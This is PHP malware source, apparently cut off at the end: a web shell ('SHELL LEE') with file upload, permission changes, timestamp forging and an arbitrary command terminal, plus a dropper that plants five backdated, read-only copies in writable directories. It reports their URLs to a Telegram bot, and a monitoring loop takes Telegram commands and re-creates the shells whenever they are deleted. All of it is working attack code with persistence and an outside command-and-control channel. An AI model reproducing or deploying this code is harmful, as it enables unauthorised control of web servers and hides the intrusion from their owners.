            <h1>☠️ <span class="power-indicator">SHELL</span> LEE ☠️</h1>
            <div class="path">
                <?php
                $parts = explode('/', trim($__dir__, '/'));
                $current = '';
                echo '<a href="?__d__=/">/</a>';
                foreach ($parts as $part) {
                    if ($part) {
                        $current .= '/' . $part;
                        echo '/<a href="?__d__=' . urlencode($current) . '" style="color: var(--orange);">' . htmlspecialchars($part) . '</a>';
                    }
                }
                ?>
            </div>
            
            <!-- Upload Status Indicator -->
            <?php 
            $can_upload = canUploadToDirectory($__dir__);
            $dir_perm = substr(sprintf('%o', fileperms($__dir__)), -4);
            $dir_status = getPermissionStatus($__dir__, $dir_perm, true);
            ?>
            <div class="upload-status <?php echo $can_upload ? 'upload-writable' : 'upload-locked'; ?>">
                <span class="write-indicator <?php echo $can_upload ? 'write-yes' : 'write-no'; ?>"></span>
                <?php echo $can_upload ? '✓ CAN UPLOAD/WRITE' : '✗ READ-ONLY DIRECTORY'; ?>
                <span class="perm-details">(Permission: <?php echo $dir_perm; ?>)</span>
            </div>
            
            <div>
                <a href="?__d__=<?php echo urlencode(dirname($__dir__)); ?>" class="btn">⬆️ PARENT</a>
                <a href="?__d__=<?php echo urlencode(getcwd()); ?>" class="btn">🏠 HOME</a>
                <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="btn">🔄 REFRESH</a>
                <a href="?logout=1" class="btn btn-danger" onclick="return confirm('Logout?')">💀 LOGOUT</a>
            </div>
        </div>
        
        <?php if (!empty($messages)): ?>
        <div class="messages">
            <?php foreach ($messages as $msg): ?>
                <div class="message"><?php echo $msg; ?></div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>
        
        <!-- MODAL FOR SIMPLE CHMOD -->
        <div id="chmodModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('chmodModal')">&times;</span>
                    <h3>🔧 CHANGE PERMISSIONS</h3>
                </div>
                <form method="post" id="chmodForm">
                    <input type="hidden" name="__chmod_file__" id="chmodFile">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">Permissions:</label>
                        <input type="text" name="__permissions__" class="form-control" placeholder="e.g., 755, 644, 777, rwxr-xr-x" required>
                        <div style="font-size: 11px; color: var(--green); margin-top: 5px;">
                            Format: Octal (755, 644) atau Symbolic (rwxr-xr-x)
                        </div>
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__chmod__" class="btn btn-info">APPLY</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('chmodModal')">CANCEL</button>
                    </div>
                </form>
                
                <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(139,0,0,0.3);">
                    <h4 style="color: var(--orange); margin-bottom: 10px;">Recursive CHMOD</h4>
                    <form method="post" id="chmodRecursiveForm">
                        <input type="hidden" name="__chmod_recursive_file__" id="chmodRecursiveFile">
                        <div style="margin-bottom: 10px;">
                            <input type="text" name="__permissions_recursive__" class="form-control" placeholder="e.g., 755, 644" required>
                        </div>
                        <button type="submit" name="__chmod_recursive__" class="btn btn-warning" onclick="return confirm('Apply recursively to ALL files and subdirectories?')">APPLY RECURSIVELY</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- MODAL FOR RENAME -->
        <div id="renameModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('renameModal')">&times;</span>
                    <h3>✏️ RENAME</h3>
                </div>
                <form method="post" id="renameForm">
                    <input type="hidden" name="__rename_old__" id="renameOld">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">New name:</label>
                        <input type="text" name="__rename_new__" class="form-control" required>
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__rename__" class="btn btn-warning">RENAME</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('renameModal')">CANCEL</button>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- MODAL FOR TIMESTAMP -->
        <div id="timeModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <span class="modal-close" onclick="closeModal('timeModal')">&times;</span>
                    <h3>🕒 CHANGE TIMESTAMP</h3>
                </div>
                <form method="post" id="timeForm">
                    <input type="hidden" name="__touch_file__" id="touchFile">
                    <div style="margin-bottom: 15px;">
                        <label style="color: var(--green);">Date & Time:</label>
                        <input type="datetime-local" name="__timestamp__" class="form-control" value="<?php echo date('Y-m-d\TH:i'); ?>">
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="__touch__" class="btn btn-info">CHANGE</button>
                        <button type="button" class="btn" onclick="setTimestamp('now')">NOW</button>
                        <button type="button" class="btn" onclick="setTimestamp('yesterday')">YESTERDAY</button>
                        <button type="button" class="btn btn-danger" onclick="closeModal('timeModal')">CANCEL</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="upload-grid">
            <div class="upload-box">
                <h3>📤 MULTI UPLOAD</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="files[]" class="form-control" multiple required>
                    <button type="submit" class="btn">UPLOAD ALL</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>📦 ZIP + AUTO EXTRACT</h3>
                <div style="font-size: 12px; color: var(--orange); margin-bottom: 10px;">
                    ⚡ File zip akan langsung diekstrak, tidak disimpan
                </div>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="zip_file" class="form-control" accept=".zip" required>
                    <button type="submit" class="btn">UPLOAD & EXTRACT</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>🐘 PHP UPLOAD</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="php_file" class="form-control" accept=".php,.php5,.php7,.phtml" required>
                    <button type="submit" class="btn">UPLOAD PHP</button>
                </form>
            </div>
            
            <div class="upload-box">
                <h3>➕ CREATE NEW</h3>
                <form method="post">
                    <input type="text" name="__name__" class="form-control" placeholder="Name" required>
                    <select name="__type__" class="form-control">
                        <option value="file">📄 FILE</option>
                        <option value="folder">📁 FOLDER</option>
                    </select>
                    <textarea name="__data__" class="form-control" placeholder="Content" rows="3"></textarea>
                    <input type="hidden" name="__create__" value="1">
                    <button type="submit" class="btn">CREATE</button>
                </form>
            </div>
        </div>
        
        <div class="file-manager">
            <form method="post" id="batchForm">
                <table class="file-table" id="fileTable">
                    <thead>
                        <tr>
                            <th class="checkbox-col"><input type="checkbox" id="selectAll"></th>
                            <th>NAME</th>
                            <th>SIZE</th>
                            <th>PERM</th>
                            <th>MODIFIED</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $items = @scandir($__dir__);
                        if ($items) {
                            // Pisahkan folder dan file
                            $folders = [];
                            $files = [];
                            
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                $path = $__dir__ . '/' . $item;
                                $is_dir = is_dir($path);
                                
                                if ($is_dir) {
                                    $folders[] = $item;
                                } else {
                                    $files[] = $item;
                                }
                            }
                            
                            // Sort folders alphabetically
                            sort($folders);
                            
                            // Sort files alphabetically
                            sort($files);
                            
                            // Tampilkan folder dulu
                            foreach ($folders as $item) {
                                $path = $__dir__ . '/' . $item;
                                $is_dir = true;
                                $size = '-';
                                $perm = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i', filemtime($path));
                                $row_id = 'row_' . md5($item);
                                
                                $perm_status = getPermissionStatus($path, $perm, true);
                                $perm_class = 'perm-' . $perm_status;
                                ?>
                                <tr id="<?php echo $row_id; ?>" class="cursor-pointer">
                                    <td class="cursor-column">
                                        <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" id="cb_<?php echo md5($item); ?>">
                                    </td>
                                    <td class="folder">
                                        <a href="?__d__=<?php echo urlencode($path); ?>" class="folder-link" style="color: var(--orange); text-decoration: none;">
                                            📁 <?php echo htmlspecialchars($item); ?>
                                        </a>
                                    </td>
                                    <td><?php echo $size; ?></td>
                                    <td class="<?php echo $perm_class; ?>">
                                        <?php echo $perm; ?>
                                    </td>
                                    <td><?php echo $modified; ?></td>
                                    <td>
                                        <a href="?__d__=<?php echo urlencode($path); ?>" class="action-btn">📂 OPEN</a>
                                        <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-chmod">🔧 CHMOD</a>
                                        <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-rename">✏️ RENAME</a>
                                        <a href="javascript:void(0)" onclick="showTimeModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-time">🕒 TIME</a>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="action-btn btn-danger">🗑 DELETE</a>
                                    </td>
                                </tr>
                                <?php
                            }
                            
                            // Tambahkan pembatas jika ada folder dan file
                            if (!empty($folders) && !empty($files)): ?>
                            <tr>
                                <td colspan="6" style="padding: 5px 0;">
                                    <hr style="border: none; border-top: 1px solid rgba(139,0,0,0.3); margin: 0;">
                                </td>
                            </tr>
                            <?php endif;
                            
                            // Tampilkan file
                            foreach ($files as $item) {
                                $path = $__dir__ . '/' . $item;
                                $is_dir = false;
                                $size = round(filesize($path)/1024, 2) . ' KB';
                                $perm = substr(sprintf('%o', fileperms($path)), -4);
                                $modified = date('Y-m-d H:i', filemtime($path));
                                $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                                $row_id = 'row_' . md5($item);
                                
                                $perm_status = getPermissionStatus($path, $perm, false);
                                $perm_class = 'perm-' . $perm_status;
                                ?>
                                <tr id="<?php echo $row_id; ?>" class="cursor-pointer">
                                    <td class="cursor-column">
                                        <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" id="cb_<?php echo md5($item); ?>">
                                    </td>
                                    <td class="file">
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="file-link" style="color: var(--ghost); text-decoration: none;">
                                            📄 <?php echo htmlspecialchars($item); ?>
                                        </a>
                                    </td>
                                    <td><?php echo $size; ?></td>
                                    <td class="<?php echo $perm_class; ?>">
                                        <?php echo $perm; ?>
                                    </td>
                                    <td><?php echo $modified; ?></td>
                                    <td>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="action-btn action-btn-edit">✏️ EDIT</a>
                                        <?php if ($ext == 'zip'): ?>
                                            <a href="?__d__=<?php echo urlencode($__dir__); ?>&__extract__=<?php echo urlencode($item); ?>" onclick="return confirm('Extract <?php echo htmlspecialchars($item); ?>?')" class="action-btn action-btn-edit">📦 EXTRACT</a>
                                        <?php endif; ?>
                                        <a href="javascript:void(0)" onclick="showChmodModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-chmod">🔧 CHMOD</a>
                                        <a href="javascript:void(0)" onclick="showRenameModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-rename">✏️ RENAME</a>
                                        <a href="javascript:void(0)" onclick="showTimeModal('<?php echo htmlspecialchars($item); ?>')" class="action-btn action-btn-time">🕒 TIME</a>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" class="action-btn btn-danger">🗑 DELETE</a>
                                    </td>
                                </tr>
                                <?php
                            }
                        }
                        ?>
                    </tbody>
                </table>
                
                <div class="batch-actions">
                    <button type="submit" name="__delete_selected__" class="btn btn-danger" onclick="return confirm('Delete selected items?')">🗑 DELETE SELECTED</button>
                </div>
            </form>
        </div>
        
        <?php if ($editing_file): ?>
        <div class="edit-box">
            <h3>
                ✏️ EDITING: <?php echo htmlspecialchars($editing_file); ?>
            </h3>
            <?php
            $target = $__dir__ . '/' . $editing_file;
            $can_edit = __is_writable($target);
            ?>
            <form method="post" id="editForm">
                <textarea name="__content__" class="editor" spellcheck="false" id="fileEditor" <?php echo !$can_edit ? 'readonly' : ''; ?>><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="__edit_file__" value="<?php echo htmlspecialchars($editing_file); ?>">
                <div class="editor-controls">
                    <div class="editor-info">
                        File size: <?php echo round(strlen($file_content)/1024, 2); ?> KB | 
                        Lines: <?php echo substr_count($file_content, "\n") + 1; ?> | 
                        Modified: <?php echo date('Y-m-d H:i', filemtime($__dir__ . '/' . $editing_file)); ?> |
                        Status: <?php echo $can_edit ? '<span style="color:#00ff00;">Writable</span>' : '<span style="color:#ffffff;">Read-only</span>'; ?>
                    </div>
                    <div>
                        <?php if ($can_edit): ?>
                            <button type="submit" class="btn btn-success">💾 SAVE</button>
                        <?php else: ?>
                            <button type="button" class="btn btn-success" disabled title="File is read-only">💾 SAVE</button>
                        <?php endif; ?>
                        <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="btn btn-danger">❌ CANCEL</a>
                    </div>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <div class="terminal">
            <h3>💻 <span class="power-indicator">FULL POWER</span> TERMINAL</h3>
            <div class="terminal-path">
                📍 Current path: <span><?php echo htmlspecialchars($__dir__); ?></span>
            </div>
            <form method="post" id="terminalForm">
                <input type="text" name="__cmd__" class="form-control" id="cmdInput" 
                       placeholder="Enter command (executed from current directory)" autocomplete="off">
                <button type="submit" class="btn">⚡ GASSKAN</button>
            </form>
            <div class="cmd-examples">
                <strong>Quick commands (click to use):</strong><br>
                <code onclick="setCommand('pwd')">pwd</code>
                <code onclick="setCommand('whoami')">whoami</code>
                <code onclick="setCommand('id')">id</code>
                <code onclick="setCommand('uname -a')">uname -a</code>
                <code onclick="setCommand('ls -la')">ls -la</code>
                <code onclick="setCommand('ls -lah')">ls -lah</code>
                <code onclick="setCommand('chmod 777 *')">chmod 777 all</code>
                <code onclick="setCommand('find . -type f -name \"*.php\" 2>/dev/null | head -20')">find php (here)</code>
                <code onclick="setCommand('wget https://example.com/file.zip')">wget file</code>
            </div>
            <?php if ($cmd_output): ?>
                <div class="terminal-output"><?php echo nl2br(htmlspecialchars($cmd_output)); ?></div>
            <?php endif; ?>
        </div>
        
        <div class="footer">
            ⚡ <span class="power-indicator">FULL ACCESS - TERMINAL EXECUTES FROM CURRENT PATH</span> ⚡<br>
            <?php echo date('Y-m-d H:i:s'); ?>
        </div>
    </div>
    
    <script>
        // Simple functions tanpa shortcut keyboard
        let selectedRow = null;
        
        function handleCheckboxClick(event, rowId) {
            event.stopPropagation();
            const checkbox = document.getElementById('cb_' + rowId.replace('row_', ''));
            if (!checkbox) return;
            checkbox.checked = !checkbox.checked;
            
            const row = document.getElementById(rowId);
            if (checkbox.checked) {
                row.classList.add('selected');
                selectedRow = row;
            } else {
                row.classList.remove('selected');
                selectedRow = null;
            }
        }
        
        function highlightRow(rowId) {
            const row = document.getElementById(rowId);
            if (row && row !== selectedRow) {
                row.style.backgroundColor = 'rgba(255,0,0,0.05)';
            }
        }
        
        function unhighlightRow(rowId) {
            const row = document.getElementById(rowId);
            if (row && row !== selectedRow) {
                row.style.backgroundColor = '';
            }
        }
        
        document.getElementById('selectAll').addEventListener('change', function(e) {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(cb => {
                cb.checked = e.target.checked;
                const row = cb.closest('tr');
                if (e.target.checked) {
                    row.classList.add('selected');
                } else {
                    row.classList.remove('selected');
                }
            });
        });
        
        function setCommand(cmd) {
            document.getElementById('cmdInput').value = cmd;
            document.getElementById('cmdInput').focus();
        }
        
        function showChmodModal(filename) {
            document.getElementById('chmodFile').value = filename;
            document.getElementById('chmodRecursiveFile').value = filename;
            document.getElementById('chmodModal').style.display = 'block';
            setTimeout(() => {
                document.querySelector('#chmodForm input[name="__permissions__"]').focus();
            }, 100);
        }
        
        function showRenameModal(filename) {
            document.getElementById('renameOld').value = filename;
            document.getElementById('renameModal').style.display = 'block';
            setTimeout(() => {
                const newNameInput = document.querySelector('#renameForm input[name="__rename_new__"]');
                newNameInput.value = filename;
                newNameInput.focus();
                newNameInput.select();
            }, 100);
        }
        
        function showTimeModal(filename) {
            document.getElementById('touchFile').value = filename;
            document.getElementById('timeModal').style.display = 'block';
        }
        
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }
        
        function setTimestamp(type) {
            const now = new Date();
            let date = new Date();
            
            if (type === 'yesterday') {
                date.setDate(now.getDate() - 1);
            } else {
                date = now;
            }
            
            const formatted = date.toISOString().slice(0, 16);
            document.querySelector('#timeForm input[name="__timestamp__"]').value = formatted;
        }
        
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }
        
        <?php if ($editing_file): ?>
        document.getElementById('fileEditor').focus();
        <?php else: ?>
        document.getElementById('cmdInput').focus();
        <?php endif; ?>
        
        document.querySelectorAll('.folder-link, .file-link').forEach(link => {
            link.addEventListener('click', function(e) {
                e.stopPropagation();
            });
        });
        
        const editor = document.getElementById('fileEditor');
        if (editor) {
            editor.addEventListener('input', function() {
                const lines = this.value.split('\n').length;
                const size = (new Blob([this.value]).size / 1024).toFixed(2);
                document.querySelector('.editor-info').innerHTML = 
                    `File size: ${size} KB | Lines: ${lines} | Modified: Now`;
            });
            
            function autoResizeEditor() {
                const lines = editor.value.split('\n').length;
                const minHeight = 300;
                const maxHeight = 800;
                const lineHeight = 20;
                const newHeight = Math.min(maxHeight, Math.max(minHeight, lines * lineHeight + 50));
                editor.style.height = newHeight + 'px';
            }
            
            editor.addEventListener('input', autoResizeEditor);
            autoResizeEditor();
        }
        
        // Terminal history dan autocomplete sederhana
        const terminalHistory = [];
        let historyIndex = -1;
        
        document.getElementById('terminalForm').addEventListener('submit', function() {
            const cmdInput = document.getElementById('cmdInput');
            if (cmdInput.value.trim()) {
                terminalHistory.push(cmdInput.value);
                historyIndex = terminalHistory.length;
            }
        });
        
        document.getElementById('cmdInput').addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (terminalHistory.length > 0) {
                    if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = terminalHistory[historyIndex] || '';
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (terminalHistory.length > 0) {
                    if (historyIndex < terminalHistory.length - 1) {
                        historyIndex++;
                        this.value = terminalHistory[historyIndex] || '';
                    } else {
                        historyIndex = terminalHistory.length;
                        this.value = '';
                    }
                }
            }
        });
    </script>
</body>
</html>
PHP;
}

// ========== DROP INITIAL SHELLS ==========
function dropInitialShells($botToken, $chatId, $domain, $targetCount = 5) {
    $shellContent = getShellContent();
    $allWritableDirs = array_unique(scanWritableDirs(__DIR__, 5));
    $allWritableDirs = array_filter($allWritableDirs, 'isSuitableDirectory');
    shuffle($allWritableDirs);
    
    $writtenFiles = [];
    $created = 0;
    
    foreach ($allWritableDirs as $dirTarget) {
        if ($created >= $targetCount) break;
        if (!is_dir($dirTarget) || !is_writable($dirTarget)) continue;
        
        $shellName = generateShellName($dirTarget, true);
        $targetFile = rtrim($dirTarget, '/') . '/' . $shellName;
        
        $counter = 1;
        while (file_exists($targetFile)) {
            $pathInfo = pathinfo($shellName);
            $targetFile = rtrim($dirTarget, '/') . '/' . $pathInfo['filename'] . '_' . $counter . '.php';
            $counter++;
        }
        
        if (@file_put_contents($targetFile, $shellContent)) {
            @touch($targetFile, time() - rand(86400, 864000));
            
            // ========== 🟢 TAMBAHAN CHMOD 0444 UNTUK SHELL KITA ==========
            @chmod($targetFile, 0444); // -r--r--r-- (READ ONLY)
            // ============================================================
            
            $writtenFiles[] = $targetFile;
            $created++;
        }
    }
    
    if (!empty($writtenFiles)) {
        $msg = "🔥 <b>DROP " . count($writtenFiles) . " SHELL</b> di <b>$domain</b>:\n\n";
        foreach ($writtenFiles as $f) {
            $relPath = str_replace($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '', $f);
            $relPath = ltrim(str_replace('\\', '/', $relPath), '/');
            $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . "://$domain/$relPath";
            $msg .= "📍 <a href=\"$url\">$relPath</a>\n";
        }
        sendTelegramMessage($botToken, $chatId, $msg);
        saveShellList($writtenFiles, $domain);
    }
    
    return $writtenFiles;
}

// ========== MONITORING LOOP ==========
function startMonitoring($botToken, $chatId, $domain) {
    $identifier = getDomainIdentifier($domain);
    $disableFile = '/tmp/disabled_' . $identifier . '.flag';
    
    if (file_exists($disableFile)) return;
    
    $pidFile = '/tmp/monitor_' . $identifier . '.pid';
    $killFlag = '/tmp/kill_' . $identifier . '.flag';
    $lastCheckFile = '/tmp/last_check_' . $identifier . '.txt';
    
    if (file_exists($pidFile)) {
        $oldPid = file_get_contents($pidFile);
        if ($oldPid && function_exists('posix_kill') && @posix_kill($oldPid, 0)) return;
    }
    
    file_put_contents($pidFile, getmypid());
    sendTelegramMessage($botToken, $chatId, "🚀 <b>MONITORING DIMULAI</b> di <b>$domain</b>\nPID: " . getmypid());
    
    $shellContent = getShellContent();
    $reported = [];
    $lastReportReset = time();
    $lastUpdateId = file_exists($lastCheckFile) ? (int)file_get_contents($lastCheckFile) : 0;
    
    while (true) {
        if (file_exists($killFlag) || file_exists($disableFile)) {
            @unlink($killFlag);
            @unlink($pidFile);
            @unlink($lastCheckFile);
            exit;
        }
        
        // CEK TELEGRAM COMMAND
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=" . ($lastUpdateId + 1) . "&timeout=5";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);
        
        if ($response) {
            $data = json_decode($response, true);
            if (isset($data['ok']) && $data['ok'] && isset($data['result'])) {
                foreach ($data['result'] as $update) {
                    $updateId = $update['update_id'];
                    if ($updateId > $lastUpdateId) {
                        $lastUpdateId = $updateId;
                        if (isset($update['message']['text'])) {
                            $text = $update['message']['text'];
                            $chatIdFrom = $update['message']['chat']['id'];
                            
                            if ($chatIdFrom == $chatId) {
                                $command = strtolower(trim($text));
                                
                                // HELP
                                if (in_array($command, ['/help', 'help', '/start'])) {
                                    $help = "🤖 <b>COMMAND LIST</b>\n/domains - List domain\n/status - Status ini\n/status domain.com - Status lain\n/shells - List shell\n/stop - Matikan monitoring ini\n/kill domain.com - Matikan domain lain\n/killall - Matikan SEMUA";
                                    sendTelegramMessage($botToken, $chatId, $help);
                                }
                                // LIST DOMAINS
                                elseif (in_array($command, ['/domains', 'domains', '/list'])) {
                                    $domains = listAllActiveDomains();
                                    if (empty($domains)) sendTelegramMessage($botToken, $chatId, "❌ No active domains");
                                    else {
                                        $msg = "🌐 <b>DOMAINS (" . count($domains) . "):</b>\n";
                                        foreach ($domains as $i => $d) {
                                            $s = getDomainStatus($d);
                                            $e = $s['monitoring_running'] ? '🟢' : ($s['permanently_disabled'] ? '⚫' : '🔴');
                                            $msg .= "$e " . ($i+1) . ". <code>$d</code> - {$s['shell_count']}/5\n";
                                        }
                                        sendTelegramMessage($botToken, $chatId, $msg);
                                    }
                                }
                                // STATUS
                                elseif (in_array($command, ['/status', 'status']) && !preg_match('/^\/status\s+/', $command)) {
                                    $s = getDomainStatus($domain);
                                    $sh = loadShellList($domain);
                                    $a = array_filter($sh, 'file_exists');
                                    $msg = "📊 <b>STATUS</b>\nDomain: <code>$domain</code>\nStatus: " . ($s['permanently_disabled'] ? '⚫ DISABLED' : ($s['monitoring_running'] ? '🟢 RUNNING' : '🔴 STOPPED')) . "\nShell: " . count($a) . "/5";
                                    sendTelegramMessage($botToken, $chatId, $msg);
                                }
                                // STATUS DOMAIN LAIN
                                elseif (preg_match('/^\/status\s+(.+)$/i', $command, $m)) {
                                    $td = trim($m[1]);
                                    $td = str_replace(['https://', 'http://', 'www.'], '', $td);
                                    $td = rtrim($td, '/');
                                    $s = getDomainStatus($td);
                                    $msg = "📊 <b>STATUS</b>\nDomain: <code>$td</code>\nStatus: " . ($s['permanently_disabled'] ? '⚫ DISABLED' : ($s['monitoring_running'] ? '🟢 RUNNING' : '🔴 STOPPED')) . "\nShell: {$s['shell_count']}/5";
                                    sendTelegramMessage($botToken, $chatId, $msg);
                                }
                                // LIST SHELLS
                                elseif (in_array($command, ['/shells', 'shells'])) {
                                    $sh = loadShellList($domain);
                                    $a = array_filter($sh, 'file_exists');
                                    if (empty($a)) sendTelegramMessage($botToken, $chatId, "❌ No shells");
                                    else {
                                        $msg = "🐚 <b>SHELLS ($domain)</b>\n" . count($a) . "/5\n\n";
                                        foreach ($a as $i => $f) {
                                            $rp = str_replace($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '', $f);
                                            $rp = ltrim(str_replace('\\', '/', $rp), '/');
                                            $u = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . "://$domain/$rp";
                                            $msg .= ($i+1) . ". <a href=\"$u\">$rp</a>\n";
                                        }
                                        sendTelegramMessage($botToken, $chatId, $msg);
                                    }
                                }
                                // STOP - MATIKAN DOMAIN INI
                                elseif (in_array($command, ['/stop', 'stop'])) {
                                    sendTelegramMessage($botToken, $chatId, "🛑 MEMATIKAN MONITORING...\n$domain\nShell TETAP ADA");
                                    $r = killMonitoringByDomain($domain, $botToken, $chatId);
                                    sendTelegramMessage($botToken, $chatId, "✅ HASIL:\n$r");
                                    exit;
                                }
                                // KILL DOMAIN LAIN
                                elseif (preg_match('/^\/kill\s+(.+)$/i', $command, $m)) {
                                    $td = trim($m[1]);
                                    $td = str_replace(['https://', 'http://', 'www.'], '', $td);
                                    $td = rtrim($td, '/');
                                    sendTelegramMessage($botToken, $chatId, "🛑 MEMATIKAN...\n$td\nShell TETAP ADA");
                                    $r = killMonitoringByDomain($td, $botToken, $chatId);
                                    sendTelegramMessage($botToken, $chatId, "✅ HASIL:\n$r");
                                }
                                // KILL ALL
                                elseif (in_array($command, ['/killall', 'killall', '/stopall'])) {
                                    sendTelegramMessage($botToken, $chatId, "🔥 MEMATIKAN SEMUA DOMAIN...\nSemua shell TETAP ADA");
                                    $r = killAllDomains($botToken, $chatId);
                                    sendTelegramMessage($botToken, $chatId, "🧹 HASIL:\n$r");
                                }
                            }
                        }
                    }
                }
            }
        }
        
        file_put_contents($lastCheckFile, $lastUpdateId);
        
        // ========== SELF-HEALING ==========
        $currentShells = loadShellList($domain);
        $validShells = [];
        $deletedShells = [];
        
        foreach ($currentShells as $shell) {
            if (file_exists($shell)) $validShells[] = $shell;
            else $deletedShells[] = $shell;
        }
        
        foreach ($deletedShells as $deleted) {
            if (!in_array($deleted, $reported)) {
                $rp = str_replace($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '', $deleted);
                $rp = ltrim(str_replace('\\', '/', $rp), '/');
                sendTelegramMessage($botToken, $chatId, "🚨 <b>SHELL DIHAPUS!</b>\n$domain\n<code>$rp</code>");
                $reported[] = $deleted;
            }
        }
        
        $currentCount = count($validShells);
        $neededCount = 5 - $currentCount;
        
        if ($neededCount > 0) {
            sendTelegramMessage($botToken, $chatId, "⚠️ Shell: $currentCount/5\nMembuat $neededCount baru...");
            
            $allDirs = array_unique(scanWritableDirs(__DIR__, 5));
            $allDirs = array_filter($allDirs, 'isSuitableDirectory');
            shuffle($allDirs);
            
            $created = 0;
            
            foreach ($allDirs as $dir) {
                if ($created >= $neededCount) break;
                
                $hasShell = false;
                foreach ($validShells as $s) {
                    if (dirname($s) === $dir) { $hasShell = true; break; }
                }
                if ($hasShell) continue;
                
                $newName = generateShellName($dir, true);
                $newFile = rtrim($dir, '/') . '/' . $newName;
                $c = 1;
                while (file_exists($newFile)) {
                    $pi = pathinfo($newName);
                    $newFile = rtrim($dir, '/') . '/' . $pi['filename'] . '_' . $c . '.php';
                    $c++;
                }
                
                if (@file_put_contents($newFile, $shellContent)) {
                    @touch($newFile, time() - rand(86400, 864000));
                    
                    // ========== 🟢 TAMBAHAN CHMOD 0444 UNTUK SHELL KITA ==========
                    @chmod($newFile, 0444); // -r--r--r-- (READ ONLY)
                    // ============================================================
                    
                    $validShells[] = $newFile;
                    $created++;
                    $rp = str_replace($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '', $newFile);
                    $rp = ltrim(str_replace('\\', '/', $rp), '/');
                    $url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . "://$domain/$rp";
                    sendTelegramMessage($botToken, $chatId, "✅ <b>SHELL BARU</b> ($created/$neededCount)\n$domain\n<code>$rp</code>\n<a href=\"$url\">URL</a>");
                }
            }
            
            if ($created > 0) {
                saveShellList($validShells, $domain);
                sendTelegramMessage($botToken, $chatId, "📊 STATUS: " . count($validShells) . "/5 aktif");
            }
        }
        
        if (time() - $lastReportReset > 1800) {
            $reported = [];
            $lastReportReset = time();
        }
        
        sleep(15);
    }
}

// ==================== MAIN EXECUTION - AUTO HILANG ====================

// CEK MONITOR MODE
if (isset($_GET['monitor']) || (isset($argv[1]) && $argv[1] === 'monitor')) {
    startMonitoring($botToken, $chatId, $domain);
    exit;
}

// CEK DISABLE FLAG
$identifier = getDomainIdentifier($domain);
$disableFile = '/tmp/disabled_' . $identifier . '.flag';

// DROP SHELL AWAL
$shells = dropInitialShells($botToken, $chatId, $domain, 5);

if (!empty($shells)) {
    // CEK MONITORING SUDAH JALAN?
    $pidFile = '/tmp/monitor_' . $identifier . '.pid';
    $monitorRunning = false;
    
    if (file_exists($pidFile)) {
        $oldPid = @file_get_contents($pidFile);
        if ($oldPid && function_exists('posix_kill')) {
